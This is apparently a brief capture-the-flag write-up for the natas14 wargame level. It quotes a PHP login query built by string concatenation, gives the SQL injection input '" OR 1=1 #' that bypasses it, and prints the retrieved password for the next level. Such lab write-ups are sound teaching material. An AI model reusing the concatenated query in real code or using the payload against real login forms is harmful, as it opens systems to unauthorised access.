Simple SQL injection, from the sourcecode, we can see the query:
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and
password=\"".$_REQUEST["password"]."\"";

SELECT * from users where username="" and password=""

all we need to do is to enter:
" OR 1=1 #
=> SELECT * from users where username="" OR TRUE #

flag retrieved: Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
